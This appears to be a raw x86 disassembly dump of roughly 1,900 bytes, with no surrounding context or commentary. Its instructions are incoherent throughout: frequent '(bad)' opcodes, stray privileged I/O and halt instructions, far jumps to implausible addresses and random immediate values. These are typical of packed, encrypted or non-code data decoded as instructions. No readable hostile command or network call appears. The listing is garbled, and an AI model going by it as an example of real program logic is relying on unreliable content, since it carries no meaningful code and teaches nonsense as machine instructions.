  412410:	and    esi,DWORD PTR [si-0x7bda]
  412415:	inc    ecx
  412416:	or     DWORD PTR gs:[esi-0x44],esp
  41241a:	loopne 0x412466
  41241c:	mov    ah,0xa7
  41241e:	scas   al,BYTE PTR es:[edi]
  41241f:	cli    
  412420:	inc    edx
  412421:	and    al,0x66
  412423:	pop    ebx
  412424:	and    BYTE PTR [bp-0x24aa],0x88
  41242a:	or     ecx,DWORD PTR [ecx+0x6f]
  41242d:	mov    gs,eax
  41242f:	mov    WORD PTR ds:[ecx+0x36235ec5],gs
  412436:	test   al,0x65
  412438:	ins    BYTE PTR es:[edi],dx
  412439:	rcl    BYTE PTR [eax+0x48f92661],1
  41243f:	shl    DWORD PTR [ecx+0x13],1
  412442:	mov    ebp,0xa7ff0196
  412447:	jns    0x41249b
  412449:	data16 jg 0x412453
  41244c:	fidiv  DWORD PTR [eax]
  41244e:	mov    edx,0x2e368b0b
  412453:	xor    edx,DWORD PTR [esi]
  412455:	outs   dx,DWORD PTR ds:[esi]
  412456:	xrelease mov DWORD PTR [esi],ecx
  412459:	mov    bh,0xf2
  41245b:	(bad)  
  41245c:	add    BYTE PTR [edx],dl
  41245e:	cwde   
  41245f:	pop    ss
  412460:	repnz shr DWORD PTR [edx-0x1e],cl
  412464:	fdiv   DWORD PTR [edx+0x6c]
  412467:	add    al,0xa
  412469:	xor    al,0xd9
  41246b:	jmp    0x84fb8220
  412470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412471:	loope  0x4124cd
  412473:	jbe    0x4124a9
  412475:	jecxz  0x4124d2
  412477:	mov    esp,0x638720cc
  41247c:	shl    DWORD PTR [edx+eiz*8-0x5b],cl
  412480:	push   ecx
  412481:	xor    cl,BYTE PTR [ecx-0x2e]
  412484:	in     eax,dx
  412485:	cld    
  412486:	xor    BYTE PTR [ecx+0x1b],al
  412489:	sbb    eax,0x7c55df6e
  41248e:	imul   ebx,ebx,0x178ea701
  412494:	cmp    eax,DWORD PTR [eax-0x40]
  412497:	adc    al,0xd1
  412499:	shl    BYTE PTR [esi-0x13e667de],cl
  41249f:	inc    edi
  4124a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124a1:	jno    0x41245b
  4124a3:	dec    esi
  4124a4:	pop    edi
  4124a5:	adc    BYTE PTR [esi-0x3400c66],dl
  4124ab:	add    eax,0x9309e081
  4124b0:	pusha  
  4124b1:	jbe    0x41250b
  4124b3:	sub    ebx,eax
  4124b5:	adc    edx,DWORD PTR [esi]
  4124b7:	gs sti 
  4124b9:	les    esp,FWORD PTR [ebx+0x15]
  4124bc:	(bad)  
  4124bd:	idiv   DWORD PTR [edx+0x7cf00490]
  4124c3:	or     eax,0x1c49ba6b
  4124c8:	out    dx,eax
  4124c9:	loopne 0x412450
  4124cb:	clc    
  4124cc:	in     al,dx
  4124cd:	and    al,0xae
  4124cf:	adc    BYTE PTR [esi],ch
  4124d1:	mov    BYTE PTR [edi+0x65],bh
  4124d4:	mov    al,ds:0x7452ddab
  4124d9:	js     0x41251d
  4124db:	sahf   
  4124dc:	loop   0x41252a
  4124de:	push   esp
  4124df:	je     0x41246e
  4124e1:	or     dh,BYTE PTR [ecx]
  4124e3:	xor    eax,edx
  4124e5:	cmp    BYTE PTR [eax+0x2ee14866],0xe7
  4124ec:	in     al,0x4c
  4124ee:	mov    DWORD PTR [ebx+0x21],esp
  4124f1:	aam    0x7a
  4124f3:	inc    ebx
  4124f4:	fadd   DWORD PTR [ecx]
  4124f6:	add    ecx,0x8e77e818
  4124fc:	pop    edi
  4124fd:	leave  
  4124fe:	scas   al,BYTE PTR es:[edi]
  4124ff:	call   0x84382f35
  412504:	lea    edi,[ebx]
  412506:	stc    
  412507:	call   edx
  412509:	jbe    0x412532
  41250b:	push   ss
  41250c:	xchg   esp,eax
  41250d:	jnp    0x4124a0
  41250f:	sub    BYTE PTR [edi],bh
  412511:	ja     0x412497
  412513:	scas   al,BYTE PTR es:[edi]
  412514:	shr    DWORD PTR [ebx+0x27],0xd
  412518:	test   esi,esi
  41251a:	sub    dh,BYTE PTR [edi-0x2260812a]
  412520:	mov    dl,0xe5
  412522:	rol    DWORD PTR [ebx+ebx*4-0x2b],cl
  412526:	push   ebx
  412527:	nop
  412528:	jne    0x4125a4
  41252a:	addr16 std 
  41252c:	cld    
  41252d:	jg     0x412545
  41252f:	adc    al,0xd
  412531:	mov    ecx,0x27985f9f
  412536:	dec    ebx
  412537:	or     al,0x39
  412539:	jp     0x4124e6
  41253b:	push   esi
  41253c:	xor    eax,0x7d9a6d98
  412541:	jns    0x412559
  412543:	fs repnz cwde 
  412546:	sub    esi,DWORD PTR [edx-0x75]
  412549:	cmp    eax,0xfd2b5346
  41254e:	xor    ah,BYTE PTR [ebp+0x6b128b25]
  412554:	mov    edi,0x7b2e2b41
  412559:	cmp    DWORD PTR [edx],edi
  41255b:	dec    ebp
  41255c:	add    al,0x8
  41255e:	gs out dx,al
  412560:	pop    esp
  412561:	test   eax,0xfad96b94
  412566:	fisttp WORD PTR [edx-0x70]
  412569:	outs   dx,DWORD PTR fs:[esi]
  41256b:	mov    eax,0x7322aa0e
  412570:	add    eax,0x34e74b11
  412575:	jmp    0x52e71a5d
  41257a:	jmp    0x41253e
  41257c:	jno    0x412587
  41257e:	shl    DWORD PTR [edi+0x43f2f780],0x39
  412585:	mov    ecx,0x7c8c4009
  41258a:	push   ebx
  41258b:	ds mov si,0x95d3
  412590:	sbb    BYTE PTR [esp+esi*4-0x25],ah
  412594:	mov    eax,0xfd135c76
  412599:	mov    dh,0xd9
  41259b:	cmp    al,0x39
  41259d:	push   ebp
  41259e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41259f:	cwde   
  4125a0:	(bad)  
  4125a1:	pusha  
  4125a2:	enter  0xfbab,0x46
  4125a6:	in     eax,0xa1
  4125a8:	sub    al,0x64
  4125aa:	rcl    BYTE PTR [esi-0x65ef7159],0x48
  4125b1:	cs clc 
  4125b3:	sub    al,0xe4
  4125b5:	retf   0x2949
  4125b8:	aas    
  4125b9:	icebp  
  4125ba:	jecxz  0x412595
  4125bc:	jo     0x412634
  4125be:	jne    0x41261e
  4125c0:	cmp    al,0x85
  4125c2:	jmp    0xbc7b:0xbdf0c7f2
  4125c9:	mov    cl,0x1f
  4125cb:	in     al,0x45
  4125cd:	pop    ebp
  4125ce:	add    cl,BYTE PTR [edi+0x3e619e2c]
  4125d4:	cs ret 
  4125d6:	cmp    ebp,DWORD PTR [ecx]
  4125d8:	push   eax
  4125d9:	cmp    DWORD PTR [eax+0x5314584],ebp
  4125df:	jg     0x4125d0
  4125e1:	leave  
  4125e2:	das    
  4125e3:	iret   
  4125e4:	popa   
  4125e5:	mov    edi,0xe3accd8f
  4125ea:	or     eax,0x9d999486
  4125ef:	mov    al,0x97
  4125f1:	mov    ds:0xc0615861,eax
  4125f6:	stos   DWORD PTR es:[edi],eax
  4125f7:	sahf   
  4125f8:	stc    
  4125f9:	aas    
  4125fa:	sbb    eax,0xec1e48cc
  4125ff:	cmc    
  412600:	(bad)  
  412601:	fdiv   st(2),st
  412603:	outs   dx,BYTE PTR ds:[esi]
  412604:	in     eax,dx
  412605:	jns    0x4125b1
  412607:	mov    edi,0x8bb05b8
  41260c:	jmp    0xb1077a88
  412611:	jne    0x412668
  412613:	adc    esp,DWORD PTR [edx-0x7b77d8c3]
  412619:	push   esi
  41261a:	adc    ecx,0x738db564
  412620:	in     eax,dx
  412621:	pop    ds
  412622:	shl    esi,0x6e
  412625:	call   0x15deea78
  41262a:	scas   eax,DWORD PTR es:[edi]
  41262b:	fstp   TBYTE PTR [ebx+0x53]
  41262e:	inc    edx
  41262f:	or     DWORD PTR [ebx-0x45],ebp
  412632:	push   ebx
  412633:	div    BYTE PTR [ebp+eiz*1-0x4d]
  412637:	dec    edx
  412638:	jp     0x4125db
  41263a:	and    eax,0x3312e020
  41263f:	hlt    
  412640:	cmp    eax,0xe94aab95
  412645:	inc    edi
  412646:	fnstsw WORD PTR [eax]
  412648:	popf   
  412649:	xor    al,0xe1
  41264b:	and    edi,DWORD PTR [edi+0x46d1f692]
  412651:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412652:	fiadd  DWORD PTR [edx-0x39]
  412655:	pop    eax
  412656:	cs ror BYTE PTR ds:[ebx-0x14],0x91
  41265c:	inc    edx
  41265d:	aas    
  41265e:	int    0x2f
  412660:	sahf   
  412661:	enter  0xdd3f,0x18
  412665:	jl     0x4126ba
  412667:	mov    edi,0xcc063dff
  41266c:	and    DWORD PTR [edi+0x53],ebp
  41266f:	push   cs
  412670:	mov    dl,0xce
  412672:	lock or DWORD PTR [ecx-0x5d],0x29529080
  41267a:	adc    edx,DWORD PTR [ebx]
  41267c:	pusha  
  41267d:	in     al,0x46
  41267f:	push   edi
  412680:	push   ss
  412681:	mov    esp,0x54a511f5
  412686:	js     0x412700
  412688:	sub    esp,DWORD PTR [ecx]
  41268a:	adc    BYTE PTR ds:0x69683a8e,ah
  412690:	mov    dh,0x60
  412692:	jle    0x41268f
  412694:	inc    ebp
  412695:	dec    edx
  412696:	pop    ebp
  412697:	dec    esp
  412698:	xlat   BYTE PTR ds:[ebx]
  412699:	lea    eax,[esi-0x294e4c15]
  41269f:	dec    ebx
  4126a0:	fsub   DWORD PTR [ecx+ecx*1]
  4126a3:	mov    WORD PTR [ebx-0x4832d29],?
  4126a9:	adc    edx,ebp
  4126ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126ac:	jmp    0x19215a5f
  4126b1:	jmp    0x230c:0xfdaf3b2
  4126b8:	xchg   ebp,eax
  4126b9:	fcmovu st,st(7)
  4126bb:	pusha  
  4126bc:	inc    eax
  4126bd:	shr    DWORD PTR [edx+0x714f4837],1
  4126c3:	add    ecx,DWORD PTR [ebx-0x7fdf5fb9]
  4126c9:	stc    
  4126ca:	dec    edi
  4126cb:	mov    cs,ebx
  4126cd:	and    eax,0xdfe80759
  4126d2:	xor    cl,BYTE PTR [edx+0x5f]
  4126d5:	inc    esp
  4126d6:	sub    ecx,esp
  4126d8:	sub    esp,eax
  4126da:	cmp    BYTE PTR [eax],dl
  4126dc:	push   ebp
  4126dd:	cmp    al,0xa
  4126df:	jg     0x412713
  4126e1:	loop   0x41271e
  4126e3:	(bad)  
  4126e5:	jmp    0x5efa:0x274b1c18
  4126ec:	es push edx
  4126ee:	or     al,0xb3
  4126f0:	add    ebx,DWORD PTR [ecx+0x2bbc2eb7]
  4126f6:	ins    DWORD PTR es:[edi],dx
  4126f7:	add    cl,BYTE PTR [eax+0x23630635]
  4126fd:	pop    esp
  4126fe:	push   edi
  4126ff:	push   edx
  412700:	xchg   edi,eax
  412701:	scas   al,BYTE PTR es:[edi]
  412702:	test   eax,0xf7bb6bc5
  412707:	stos   BYTE PTR es:[edi],al
  412708:	scas   eax,DWORD PTR es:[edi]
  412709:	pop    ecx
  41270a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41270b:	mov    edx,DWORD PTR [ecx-0x1]
  41270e:	sub    DWORD PTR [esi-0x6d],0xe3f9e012
  412715:	mov    ebx,0xbbecf82b
  41271a:	out    0x68,eax
  41271c:	adc    DWORD PTR [ebx],0xf2045cc5
  412722:	out    0x35,al
  412724:	enter  0xcfb4,0x7d
  412728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412729:	ror    DWORD PTR [ebx+0x1df44e2c],1
  41272f:	push   ds
  412730:	dec    edx
  412731:	jb     0x41271f
  412733:	sub    eax,0x12acac52
  412738:	ficomp DWORD PTR [ecx-0x2]
  41273b:	lahf   
  41273c:	aad    0xbc
  41273e:	mov    dh,0x1c
  412740:	xchg   ebx,eax
  412741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412742:	icebp  
  412743:	sub    ch,BYTE PTR [eax+0x6ce80a96]
  412749:	adc    DWORD PTR [ebx+0x4bb513e9],0x93ff19ca
  412753:	aad    0x9d
  412755:	push   0x68
  412757:	cli    
  412758:	inc    eax
  412759:	mov    DWORD PTR [ebp-0x16e1857c],esp
  41275f:	or     DWORD PTR [ebp+0x1bd52127],esp
  412765:	mov    dl,0xb3
  412767:	mov    eax,ds:0x66176599
  41276c:	fcomp  DWORD PTR [edi-0x6c]
  41276f:	int    0x45
  412771:	stos   DWORD PTR es:[edi],eax
  412772:	sti    
  412773:	std    
  412774:	push   ds
  412775:	fwait
  412776:	pop    ebx
  412777:	(bad)  
  412778:	cwde   
  412779:	cmp    al,0x8f
  41277b:	es cmp al,0x43
  41277e:	bound  eax,QWORD PTR [esi-0x2a]
  412781:	leave  
  412782:	jae    0x412707
  412784:	dec    ebp
  412785:	xchg   edx,eax
  412786:	push   esp
  412787:	ror    edi,0x67
  41278a:	jno    0x4127bc
  41278c:	rol    BYTE PTR [eax+0x38],0xac
  412790:	mov    al,0xc9
  412792:	mov    bh,0xb0
  412794:	jmp    0x412744
  412796:	mov    ch,0x79
  412798:	jle    0x4127b8
  41279a:	xchg   ebp,eax
  41279b:	pop    edx
  41279c:	sub    eax,0x33153a7
  4127a1:	aas    
  4127a2:	dec    ebx
  4127a3:	xor    al,0xc5
  4127a5:	out    0x41,al
  4127a7:	std    
  4127a8:	push   ebp
  4127a9:	push   esp
  4127aa:	pop    ss
  4127ab:	(bad)  
  4127ad:	jmp    0x4127a8
  4127af:	add    al,0x81
  4127b1:	jecxz  0x4127ba
  4127b3:	and    al,0x72
  4127b5:	sbb    al,0xf9
  4127b7:	sub    bl,BYTE PTR [ecx]
  4127b9:	mov    eax,DWORD PTR [esi]
  4127bb:	adc    BYTE PTR [ebp+0x6c],dh
  4127be:	mov    eax,0x2f90d00
  4127c3:	sahf   
  4127c4:	xchg   edi,eax
  4127c5:	inc    ecx
  4127c6:	enter  0xf92,0x7e
  4127ca:	mov    ebx,DWORD PTR [eax+0x65e64902]
  4127d0:	test   BYTE PTR [edx],al
  4127d2:	jae    0x4127f5
  4127d4:	clc    
  4127d5:	sub    al,BYTE PTR ds:0x9c83672f
  4127db:	sbb    dh,BYTE PTR [ebp-0x25]
  4127de:	jg     0x4127c2
  4127e0:	ret    
  4127e1:	jne    0x4127d5
  4127e3:	fwait
  4127e4:	into   
  4127e5:	jmp    0x19eb:0xea795019
  4127ec:	mov    esi,0x3a64b4ea
  4127f1:	das    
  4127f2:	dec    edi
  4127f3:	add    ch,BYTE PTR [eax-0x21]
  4127f6:	inc    ecx
  4127f7:	fs sti 
  4127f9:	shl    BYTE PTR [edi+0x2c95e9de],1
  4127ff:	jmp    0x41285c
  412801:	add    esi,DWORD PTR [edx]
  412803:	sar    DWORD PTR [ebp*8+0x11c76982],1
  41280a:	mov    dh,0x69
  41280c:	mov    dh,BYTE PTR [ecx-0x2a6e3faf]
  412812:	xchg   BYTE PTR [esi],al
  412814:	mov    ebp,0xfeac8c6
  412819:	mov    ebp,0xbfe0ab4d
  41281e:	sub    al,BYTE PTR [esi]
  412820:	jge    0x41286b
  412822:	jb     0x41286b
  412824:	lds    esi,FWORD PTR [edx]
  412826:	push   eax
  412827:	push   ecx
  412828:	dec    ebp
  412829:	iret   
  41282a:	jnp    0x412892
  41282c:	or     al,0xe1
  41282e:	pop    edx
  41282f:	scas   al,BYTE PTR es:[edi]
  412830:	adc    DWORD PTR [edi+ebp*1+0x58],ebp
  412834:	pop    esi
  412835:	or     bh,BYTE PTR [edx]
  412837:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412838:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412839:	mov    ebp,0xff90ee4b
  41283e:	test   eax,0x70f6ec9d
  412843:	add    BYTE PTR [ebp+0x5b],dl
  412846:	nop
  412847:	inc    edx
  412848:	xchg   esi,eax
  412849:	or     ebx,DWORD PTR [ecx+0x7fb745fc]
  41284f:	sbb    edi,DWORD PTR [ecx+0x4f479a35]
  412855:	scas   eax,DWORD PTR es:[edi]
  412856:	loopne 0x412891
  412858:	adc    BYTE PTR [esi],dl
  41285a:	pop    eax
  41285b:	xchg   edi,eax
  41285c:	in     al,dx
  41285d:	jne    0x4127e4
  41285f:	out    dx,eax
  412860:	jle    0x4128b6
  412862:	out    dx,eax
  412863:	retf   
  412864:	lds    eax,FWORD PTR [edi]
  412866:	inc    esp
  412867:	xchg   esi,eax
  412868:	xchg   BYTE PTR [edi-0x23],al
  41286b:	mov    ebp,0x2089217a
  412870:	in     eax,dx
  412871:	mov    ecx,0x945c6519
  412876:	data16 (bad) 
  412879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41287a:	in     eax,dx
  41287b:	jns    0x41285b
  41287d:	adc    dh,BYTE PTR [edi]
  41287f:	test   al,0x8f
  412881:	and    BYTE PTR [edx+0x35],bh
  412884:	addr16 mov ds:0x1faf,al
  412888:	or     dl,BYTE PTR [edx]
  41288a:	jns    0x412885
  41288c:	in     eax,dx
  41288d:	aad    0x6
  41288f:	sub    al,0x27
  412891:	push   ecx
  412892:	arpl   WORD PTR [ecx+eax*2+0x3e97afd8],bx
  412899:	xchg   ebx,eax
  41289a:	sbb    BYTE PTR [edx],bl
  41289c:	pop    esp
  41289d:	cmp    DWORD PTR [edi-0x4c46ae11],eax
  4128a3:	sub    esp,DWORD PTR [ebx+0x65]
  4128a6:	das    
  4128a7:	adc    cl,dh
  4128a9:	and    BYTE PTR [edi-0x492b6b7f],0xe1
  4128b0:	or     al,0xd4
  4128b2:	inc    ecx
  4128b3:	adc    esp,esp
  4128b5:	xchg   BYTE PTR [esi+0x28],cl
  4128b8:	and    ebp,DWORD PTR [ebp+0x76]
  4128bb:	outs   dx,DWORD PTR ds:[esi]
  4128bc:	fs pop es
  4128be:	xlat   BYTE PTR ds:[ebx]
  4128bf:	xlat   BYTE PTR ds:[ebx]
  4128c0:	mov    eax,0x94fbc829
  4128c5:	rcl    DWORD PTR [esp+edx*1],0x3f
  4128c9:	push   ebp
  4128ca:	ins    BYTE PTR es:[edi],dx
  4128cb:	clc    
  4128cc:	sahf   
  4128cd:	in     eax,0x67
  4128cf:	add    bl,BYTE PTR [eax-0x10]
  4128d2:	test   eax,0x62d83bf5
  4128d7:	pop    ecx
  4128d8:	loope  0x41291f
  4128da:	repnz xor BYTE PTR [edi+0x3303920c],dl
  4128e1:	hlt    
  4128e2:	scas   al,BYTE PTR es:[edi]
  4128e3:	adc    edi,edi
  4128e5:	out    0xbd,eax
  4128e7:	or     al,0x50
  4128e9:	mov    ds:0x558d8db5,eax
  4128ee:	out    dx,eax
  4128ef:	adc    dh,cl
  4128f1:	call   0x5e7a:0x632afd2
  4128f8:	xchg   edx,eax
  4128f9:	iret   
  4128fa:	lods   al,BYTE PTR ds:[esi]
  4128fb:	ret    
  4128fc:	hlt    
  4128fd:	aad    0xa3
  4128ff:	xchg   DWORD PTR [esi+0x573477fb],edi
  412905:	jnp    0x4128dc
  412907:	push   ss
  412908:	push   ebx
  412909:	js     0x412949
  41290b:	sub    BYTE PTR [edx-0x38],ah
  41290e:	ret    0x9cca
  412911:	mov    cl,0x81
  412913:	jae    0x4128c1
  412915:	imul   ecx,DWORD PTR [edi+0x57],0xc0b68f33
  41291c:	inc    ebp
  41291d:	nop
  41291e:	mov    bl,0xbf
  412920:	adc    DWORD PTR [ecx+0x57974b3f],esp
  412926:	repz add al,0xd0
  412929:	in     eax,0x98
  41292b:	jge    0x412941
  41292d:	es jp  0x41290b
  412930:	jge    0x4128ce
  412932:	ret    
  412933:	push   edi
  412934:	pop    ebp
  412935:	(bad)  
  412936:	adc    BYTE PTR [eax],ah
  412938:	jno    0x412960
  41293a:	repnz idiv DWORD PTR [eax]
  41293d:	dec    ebp
  41293e:	dec    edx
  41293f:	and    eax,0xf0bddfe8
  412944:	ins    DWORD PTR es:[edi],dx
  412945:	jecxz  0x41292a
  412947:	adc    BYTE PTR [edi],bl
  412949:	xchg   BYTE PTR [edi+0x12c5c8e],al
  41294f:	and    ecx,ecx
  412951:	pop    esp
  412952:	mov    bl,0x91
  412954:	les    eax,FWORD PTR [ecx-0x4d]
  412957:	lods   eax,DWORD PTR ds:[esi]
  412958:	xlat   BYTE PTR ds:[ebx]
  412959:	cmp    al,BYTE PTR [esi+0x34]
  41295c:	xchg   ebx,eax
  41295d:	popa   
  41295e:	rcl    DWORD PTR [ecx+0x5ee06bf6],1
  412964:	test   BYTE PTR [esi-0x7d],0x18
  412968:	push   ss
  412969:	in     al,dx
  41296a:	or     BYTE PTR [esi],ah
  41296c:	ins    DWORD PTR es:[edi],dx
  41296d:	aam    0x0
  41296f:	cmp    BYTE PTR [esi+0x1d],dh
  412972:	or     al,dh
  412974:	or     al,0xf1
  412976:	and    bh,BYTE PTR [edx-0x1c8563a8]
  41297c:	cmp    bh,dl
  41297e:	ror    DWORD PTR ds:0xdb6d1d8f,1
  412984:	imul   eax,DWORD PTR [ecx-0x31],0x1d
  412988:	stos   BYTE PTR es:[edi],al
  412989:	pop    ecx
  41298a:	stos   BYTE PTR es:[edi],al
  41298b:	and    cl,BYTE PTR [ebx+0x50]
  41298e:	cld    
  41298f:	shl    BYTE PTR [esi+0x15e31283],cl
  412995:	int    0xd3
  412997:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412998:	jg     0x412957
  41299a:	and    DWORD PTR [eax+ebx*2+0x42],0xd8e5ff0f
  4129a2:	push   ds
  4129a3:	xchg   esi,eax
  4129a4:	aaa    
  4129a5:	lahf   
  4129a6:	inc    dx
  4129a8:	sar    BYTE PTR [esi],1
  4129aa:	mov    ah,0x85
  4129ac:	data16 aad 0xac
  4129af:	mov    eax,0x9dab62e
  4129b4:	pushf  
  4129b5:	xor    eax,0xedc2b19c
  4129ba:	in     al,0xdd
  4129bc:	fwait
  4129bd:	push   cs
  4129be:	dec    eax
  4129bf:	std    
  4129c0:	sbb    eax,0x71e4aa30
  4129c5:	sub    eax,0xa000fbfb
  4129ca:	cli    
  4129cb:	pop    ebx
  4129cc:	fld    TBYTE PTR [eax-0x5e]
  4129cf:	sbb    BYTE PTR [ebx],ah
  4129d1:	dec    edi
  4129d2:	push   0x45
  4129d4:	popf   
  4129d5:	or     DWORD PTR [ebp+0x3a6a295c],edx
  4129db:	stos   BYTE PTR es:[edi],al
  4129dc:	dec    eax
  4129dd:	add    al,0x7b
  4129df:	push   es
  4129e0:	std    
  4129e1:	mov    esi,0xf77ca5ad
  4129e6:	es popa 
  4129e8:	adc    eax,0x30ddb05f
  4129ed:	(bad)  
  4129ee:	shl    DWORD PTR [ebp-0x3a],0x61
  4129f2:	mov    eax,0xfb9aeaee
  4129f7:	pop    ds
  4129f8:	dec    esp
  4129f9:	mov    ebp,DWORD PTR [edi]
  4129fb:	xor    al,BYTE PTR [esi-0x64a23ca3]
  412a01:	and    bh,BYTE PTR [ebx+edi*8]
  412a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a05:	fistp  WORD PTR [esi+0x3c768bcf]
  412a0b:	dec    ebp
  412a0c:	sahf   
  412a0d:	cmp    al,0xa3
  412a0f:	dec    edx
  412a10:	cmc    
  412a11:	xchg   edx,eax
  412a12:	jbe    0x4129da
  412a14:	dec    esi
  412a15:	dec    esp
  412a16:	mov    al,0x9b
  412a18:	int    0x59
  412a1a:	das    
  412a1b:	pop    edx
  412a1c:	test   DWORD PTR ds:0x30be6d3a,esp
  412a22:	loop   0x412a25
  412a24:	outs   dx,BYTE PTR ds:[esi]
  412a25:	ss test eax,0xb48de121
  412a2b:	push   ebp
  412a2c:	add    eax,0xda68c9ad
  412a31:	adc    DWORD PTR [ebx-0x5c],ecx
  412a34:	mov    edi,0xa77435d7
  412a39:	out    dx,al
  412a3a:	lea    ebx,[edx-0x3]
  412a3d:	push   ds
  412a3e:	mov    esp,0xab9180c7
  412a43:	cmc    
  412a44:	mov    al,ds:0xbbff888a
  412a49:	pushf  
  412a4a:	or     eax,0x228eba0b
  412a4f:	cdq    
  412a50:	pop    ebp
  412a51:	or     al,0x61
  412a53:	sbb    esi,DWORD PTR [ebx]
  412a55:	sub    DWORD PTR [ebp-0x11],ecx
  412a58:	add    BYTE PTR [eax],dh
  412a5a:	adc    al,0x3d
  412a5c:	retf   
  412a5d:	mov    bl,0x72
  412a5f:	ret    0x65c9
  412a62:	mov    ecx,0xc91156af
  412a67:	rcl    DWORD PTR [ebp-0x5e],1
  412a6a:	jecxz  0x412ac6
  412a6c:	je     0x412ac3
  412a6e:	lock push edi
  412a70:	in     al,dx
  412a71:	les    eax,FWORD PTR [eax-0x2bd16b66]
  412a77:	mov    dl,0x68
  412a79:	shr    edx,cl
  412a7b:	adc    al,0x40
  412a7d:	add    ebp,esi
  412a7f:	pop    es
  412a80:	cld    
  412a81:	repnz inc edx
  412a83:	jne    0x412aa4
  412a85:	adc    BYTE PTR ds:0x747fb90c,ah
  412a8b:	push   edi
  412a8c:	rcr    BYTE PTR [edx],0x47
  412a8f:	and    eax,0x684d899f
  412a94:	inc    ecx
  412a95:	xor    al,0xdf
  412a97:	mov    ebp,0x891fd798
  412a9c:	call   0xdcab:0x7de95350
  412aa3:	sbb    dh,BYTE PTR [ecx-0x54]
  412aa6:	xchg   esi,eax
  412aa7:	push   ecx
  412aa8:	cs cwde 
  412aaa:	popf   
  412aab:	scas   al,BYTE PTR es:[edi]
  412aac:	adc    eax,0x476cc5bc
  412ab1:	mov    edx,0xa7e8fcea
  412ab6:	or     esp,DWORD PTR [edx+ebx*1-0x54741b4]
  412abd:	dec    eax
  412abe:	jnp    0x412a83
  412ac0:	in     al,0x33
  412ac2:	add    BYTE PTR [ebx+eax*2-0x52],bl
  412ac6:	push   0x66ef5248
  412acb:	dec    esp
  412acc:	inc    ebp
  412acd:	jl     0x412ab8
  412acf:	fucom  st(5)
  412ad1:	test   eax,0x585d8a05
  412ad6:	out    dx,al
  412ad7:	sbb    DWORD PTR [esi+0x35b02da1],0x45f876e4
  412ae1:	js     0x412b2a
  412ae3:	xor    al,0xfa
  412ae5:	retf   0xdc0a
  412ae8:	ret    
  412ae9:	call   0x52ccec5
  412aee:	or     al,0x74
  412af0:	xchg   BYTE PTR [ebp-0x28],dl
  412af3:	stc    
  412af4:	lods   eax,DWORD PTR ds:[esi]
  412af5:	mov    ch,0x58
  412af7:	in     al,0xae
  412af9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412afa:	mov    ecx,0x31350bee
  412aff:	add    ah,BYTE PTR [eax]
  412b01:	int3   
  412b02:	test   DWORD PTR [esi+0x2c1a77c0],esp
  412b08:	pop    eax
  412b09:	les    eax,FWORD PTR [ecx-0x99bea8d]
  412b0f:	iret   
  412b10:	fucom  st(2)
  412b12:	sbb    DWORD PTR [eax-0x1a866625],ecx
  412b18:	stc    
  412b19:	push   ecx
  412b1a:	cmp    eax,0x863ef8f7
  412b1f:	jp     0x412ab5
  412b21:	pop    eax
  412b22:	pop    es
  412b23:	lods   al,BYTE PTR ds:[esi]
  412b24:	push   eax
  412b25:	std    
  412b26:	or     ebp,ebp
  412b28:	(bad)  [edi-0x7daf2821]
  412b2e:	jae    0x412b8f
  412b30:	mov    ah,0x3b
  412b32:	xor    ah,ah
  412b34:	sbb    BYTE PTR [eax],dh
  412b36:	(bad)  
  412b38:	xor    esp,DWORD PTR [edx+0x44]
  412b3b:	cld    
  412b3c:	inc    eax
  412b3d:	mov    cl,0x75
  412b3f:	nop
  412b40:	mov    esi,0x61bfaa49
  412b45:	sbb    ch,BYTE PTR [ecx+0x14]
  412b48:	retf   0xf9ba
  412b4b:	ins    BYTE PTR es:[edi],dx
  412b4c:	pop    ds
  412b4d:	jg     0x412af5
  412b4f:	jns    0x412b2c
  412b51:	stos   DWORD PTR es:[edi],eax
  412b52:	sub    ecx,ebx
  412b54:	add    ecx,ebp
  412b56:	pop    DWORD PTR [edi-0x291e7dc5]
  412b5c:	outs   dx,DWORD PTR ds:[esi]
  412b5d:	push   edx
  412b5e:	ror    DWORD PTR ds:0x2f5e7600,cl
  412b64:	mov    ch,0x7c
  412b66:	movlps xmm6,QWORD PTR [edx*1-0x4c4d7451]
  412b6e:	js     0x412b0c
  412b70:	fild   QWORD PTR [esi+0x62]
  412b73:	mov    eax,0x5cff1416
  412b78:	push   edi
  412b79:	fs inc edx
  412b7b:	dec    esi
  412b7c:	in     al,dx
  412b7d:	sub    DWORD PTR [ebp-0x49e95bfb],esi
  412b83:	sub    eax,0x8dc9898f
  412b88:	inc    ebx
  412b89:	pop    edx
  412b8a:	xor    BYTE PTR [esi],ah
  412b8c:	mov    esp,0xa8636526
  412b91:	sbb    al,0x60
  412b93:	cld    
  412b94:	outs   dx,BYTE PTR ds:[esi]
  412b95:	push   ebp
  412b96:	xor    eax,0x589cb2f5
  412b9b:	dec    esi
  412b9c:	into   
  412b9d:	and    ecx,ecx
  412b9f:	jne    0x412b63
  412ba1:	xchg   DWORD PTR [ebx+ebx*8],edi
  412ba4:	repz cmp BYTE PTR [esi-0x51],dl
  412ba8:	stos   BYTE PTR es:[edi],al
  412ba9:	dec    esp
  412baa:	out    dx,eax
  412bab:	(bad)  
  412bac:	cmovae ebx,eax
  412baf:	push   cs
  412bb0:	xchg   ebp,eax
  412bb1:	mov    al,0xfb
  412bb3:	adc    BYTE PTR [ecx],ah
  412bb5:	imul   ebp,edx,0x549491a3
  412bbb:	pop    edx
  412bbc:	mov    ch,0x0
  412bbe:	jg     0x412b56
  412bc0:	fidiv  WORD PTR [esi-0x3c]
  412bc3:	popf   
  412bc4:	jns    0x412c25
  412bc6:	outs   dx,BYTE PTR ds:[esi]
  412bc7:	test   al,0xd1
  412bc9:	inc    eax
  412bca:	jl     0x412bd7
  412bcc:	pop    edx
  412bcd:	sbb    al,0x8
